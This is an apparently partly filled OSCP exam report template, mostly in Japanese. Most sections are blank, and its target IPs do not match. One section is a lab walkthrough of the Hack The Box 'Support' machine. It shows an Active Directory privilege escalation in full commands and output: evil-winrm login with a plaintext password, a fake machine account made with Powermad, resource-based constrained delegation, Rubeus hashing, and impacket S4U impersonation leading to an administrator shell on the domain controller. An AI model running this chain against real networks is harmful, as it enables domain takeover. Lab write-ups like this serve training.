![[Support image 1.png]]

OSCP Penetration Test Report

v.2.0

student@youremailaddress.com

OSID: XXXXX

![[Support image.png]]

Copyright © 2023 OffSec Ltd. All rights reserved.

この出版物のいかなる部分も、その全部または一部を複製、コピー、譲渡、または著作権所有者に留保するその他の権利(コピーおよびその他すべてのコピー、ネットワークまたはその他の通信手段を使用した転送または送信、遠隔学習のための放送を含む)を、情報ストレージなどのいかなる形式または手段によっても、 OffSecからの事前の書面による許可なしに、送信または検索システム。

[1. OffSec OSCP Exam Penetration Test Report    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_gjdgxs)

[1.1 Introduction    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_30j0zll)

[1.2 Objective    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1fob9te)

[1.3 Requirements    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3znysh7)

[2. High-Level Summary    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2et92p0)

[2.1 Recommendations    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_tyjcwt)

[3. Methodologies    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3dy6vkm)

[3.1 Information Gathering    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1t3h5sf)

[3.2 Service Enumeration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4d34og8)

[3.3 Penetration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2s8eyo1)

[3.4 Maintaining Access    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_17dp8vu)

[3.5 House Cleaning    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3rdcrjn)

[4. Independent Challenges    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_26in1rg)

[4.1 Target #1 – 192.168.232.55    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_lnxbz9)

[4.1.1 Service Enumeration    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_35nkun2)

[4.1.2 Initial Access – Anonymous SMB share leads to Wordpress RCE    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ksv4uv)

[5. Active Directory Set    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_44sinio)

[5.1 Ajla – 10.4.4.10    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2jxsxqh)

[5.1.1 Initial Access – Password Brute-Forcing    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_z337ya)

[5.1.2 Privilege Escalation – Sudo group    22](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3j2qqm3)

[5.1.3 Post-Exploitation    22](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1y810tw)

[5.2 Poultry – 10.5.5.20    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4i7ojhp)

[5.2.1 Initial Access – RDP login    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2xcytpi)

[5.2.2 Post-Exploitation    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ci93xb)

[5.3 DC – 10.5.5.30    25](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2bn6wsx)

[5.3.1 Initial Access – Remote Commands Execution    25](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_qsh70q)

[5.3.2 Post-Exploitation    26](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1pxezwc)

1\. OffSec OSCP 試験ペネトレーション テスト レポート

1.1 はじめに

1.2 目的

1.3 必要条件

2\. ハイレベルなまとめ

3\. メソドロジー

3.1 情報収集

試験ネットワーク:

3.2 サービスの列挙

3.3 浸透

3.4 アクセスの維持

4\. 自主的な課題

4.1ターゲット#1–

4.1.1 初期アクセス –

4.1.2 サービス列挙

![[Support image 2.png]]

ポート スキャン結果

| **IP Address** | **Ports Open** |
| --- | --- |
| 10.10.11.174 | **TCP**: |

4.1.2 初期アクセス –

![[Support image 3.png]]

![[Support image 4.png]]

![[Support image 5.png]]

Local.txt値:e32d484997ef56419a92b69144cbc72c

4.1.3 特権エスカレーション -

┌──(root㉿kali)-\[/home/kali/CTF/HTB/Support\]

└─# evil-winrm -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> upload /home/kali/CTF/HTB/Support/Powermad.ps1

Info: Uploading /home/kali/CTF/HTB/Support/Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1

Data: 180768 bytes of 180768 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\support\Documents> upload /home/kali/CTF/HTB/Support/Rubeus.exe

Info: Uploading /home/kali/CTF/HTB/Support/Rubeus.exe to C:\Users\support\Documents\Rubeus.exe

Data: 595968 bytes of 595968 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\support\Documents> Import-Module ./Powermad.ps1

*Evil-WinRM* PS C:\Users\support\Documents> Set-Variable -Name "FakePC" -Value "FAKE01"

*Evil-WinRM* PS C:\Users\support\Documents> Set-Variable -Name "targetComputer" -Value "DC"

*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

Verbose: \[+\] Domain Controller = dc.support.htb

Verbose: \[+\] Domain = support.htb

Verbose: \[+\] SAMAccountName = FAKE01$

Verbose: \[+\] Distinguished Name = CN=FAKE01,CN=Computers,DC=support,DC=htb

\[+\] Machine account FAKE01 added

*Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')

*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount

DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb

DNSHostName                          : dc.support.htb

Enabled                              : True

Name                                 : DC

ObjectClass                          : computer

ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127

PrincipalsAllowedToDelegateToAccount : {CN=FAKE01,CN=Computers,DC=support,DC=htb}

SamAccountName                       : DC$

SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000

UserPrincipalName                    :

*Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb

______        _

(_____ \      | |

_____) )_   _| |__  _____ _   _  ___

\|  __  /| | | |  _ \| ___ | | | |/___)

\| |  \ \| |_| | |_) ) ____| |_| |___ |

\|_|   |_|____/|____/|_____)____/(___/

v2.2.0

\[*\] Action: Calculate Password Hash(es)

\[*\] Input password             : 123456

\[*\] Input username             : FAKE01$

\[*\] Input domain               : support.htb

\[*\] Salt                       : SUPPORT.HTBhostfake01.support.htb

\[*\]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4

\[*\]       aes128_cts_hmac_sha1 : 4799D0F80833802EE7F1412BD30DCD5C

\[*\]       aes256_cts_hmac_sha1 : 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B

\[*\]       des_cbc_md5          : 836D4C85A4F23B62

![[Support image 6.png]]

![[Support image 7.png]]

![[Support image 8.png]]

┌──(root㉿kali)-\[/home/kali/github/Ghostpack-CompiledBinaries\]

└─# impacket-getST support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

\[-\] CCache file is not found. Skipping...

\[*\] Getting TGT for user

\[*\] Impersonating administrator

\[*\] Requesting S4U2self

\[*\] Requesting S4U2Proxy

\[*\] Saving ticket in administrator@http_dc.support.htb@SUPPORT.HTB.ccache

┌──(root㉿kali)-\[/home/kali/github/Ghostpack-CompiledBinaries\]

└─# export KRB5CCNAME=administrator.ccache

┌──(root㉿kali)-\[/home/kali/github/Ghostpack-CompiledBinaries\]

└─# impacket-smbexec support.htb/administrator@dc.support.htb -no-pass -k

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

\[-\] \[Errno 2\] No such file or directory: 'administrator.ccache'

┌──(root㉿kali)-\[/home/kali/github/Ghostpack-CompiledBinaries\]

└─# export KRB5CCNAME=administrator@http_dc.support.htb@SUPPORT.HTB.ccache

┌──(root㉿kali)-\[/home/kali/github/Ghostpack-CompiledBinaries\]

└─# impacket-smbexec support.htb/administrator@dc.support.htb -no-pass -k

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

\[!\] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32>

![[Support image 9.png]]

4.1.4 エクスプロイト後の処理

![[Support image 10.png]]

Proof.txt値:1e96becc6c5c4fb9896ea5296ac0f181

- **5. Active Directory Set**

ポート スキャン結果

| **IP Address** | **Ports Open** |
| --- | --- |
|  | **TCP:** |
|  | **TCP:** |
|  | **TCP:** |

5.1 アジュラ – 10.4.4.10

5.1.1 初期アクセス –

5.1.2 特権エスカレーション –

重大度: クリティカル

- **5.1.3 Post-Exploitation**

Screenshot of System Proof:

- **5.2 Poultry – 10.5.5.20**
- 5.2.1 初期アクセス –
- **5.2.2 Post-Exploitation**

**Local Proof Screenshot:**

**5.3 DC – 10.5.5.30**

5.3.1 初期アクセス –

- **5.3.2 Post-Exploitation**

**System Proof Screenshot:**